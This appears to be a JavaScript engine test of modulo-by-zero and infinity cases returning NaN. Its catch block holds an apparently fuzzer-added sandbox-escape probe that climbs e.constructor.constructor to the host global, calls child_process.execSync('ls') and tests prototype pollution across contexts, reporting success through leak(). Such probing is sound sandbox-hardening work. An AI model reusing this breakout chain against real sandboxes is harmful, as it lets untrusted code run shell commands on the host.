try {
    if (isNaN(-0 % 0) !== true) {
        $ERROR('#1: -0 % 0 === Not-a-Number. Actual: ' + -0 % 0);
    }
    if (isNaN(-0 % -0) !== true) {
        $ERROR('#2: -0 % -0 === Not-a-Number. Actual: ' + -0 % -0);
    }
    if (isNaN(0 % 0) !== true) {
        $ERROR('#3: 0 % 0 === Not-a-Number. Actual: ' + 0 % 0);
    }
    if (isNaN(0 % -0) !== true) {
        $ERROR('#4: 0 % -0 === Not-a-Number. Actual: ' + 0 % -0);
    }
    if (isNaN(-1 % 0) !== true) {
        $ERROR('#5: 1 % 0 === Not-a-Number. Actual: ' + 1 % 0);
    }
    if (isNaN(-1 % -0) !== true) {
        $ERROR('#6: -1 % -0 === Not-a-Number. Actual: ' + -1 % -0);
    }
    if (isNaN(1 % 0) !== true) {
        $ERROR('#7: 1 % 0 === Not-a-Number. Actual: ' + 1 % 0);
    }
    if (isNaN(1 % -0) !== true) {
        $ERROR('#8: 1 % -0 === Not-a-Number. Actual: ' + 1 % -0);
    }
    if (isNaN(Number.NEGATIVE_INFINITY % 0) !== true) {
        $ERROR('#9: Infinity % 0 === Not-a-Number. Actual: ' + Infinity % 0);
    }
    if (isNaN(Number.NEGATIVE_INFINITY % -0) !== true) {
        $ERROR('#10: -Infinity % -0 === Not-a-Number. Actual: ' + -Infinity % -0);
    }
    if (isNaN(Number.POSITIVE_INFINITY % 0) !== true) {
        $ERROR('#11: Infinity % 0 === Not-a-Number. Actual: ' + Infinity % 0);
    }
    if (isNaN(Number.POSITIVE_INFINITY % -0) !== true) {
        $ERROR('#12: Infinity % -0 === Not-a-Number. Actual: ' + Infinity % -0);
    }
    if (isNaN(Number.MIN_VALUE % 0) !== true) {
        $ERROR('#13: Number.MIN_VALUE % 0 === Not-a-Number. Actual: ' + Number.MIN_VALUE % 0);
    }
    if (isNaN(Number.MIN_VALUE % -0) !== true) {
        $ERROR('#14: -Number.MIN_VALUE % -0 === Not-a-Number. Actual: ' + -Number.MIN_VALUE % -0);
    }
    if (isNaN(Number.MAX_VALUE % 0) !== true) {
        $ERROR('#15: Number.MAX_VALUE % 0 === Not-a-Number. Actual: ' + Number.MAX_VALUE % 0);
    }
    if (isNaN(Number.MAX_VALUE % -0) !== true) {
        $ERROR('#16: Number.MAX_VALUE % -0 === Not-a-Number. Actual: ' + Number.MAX_VALUE % -0);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}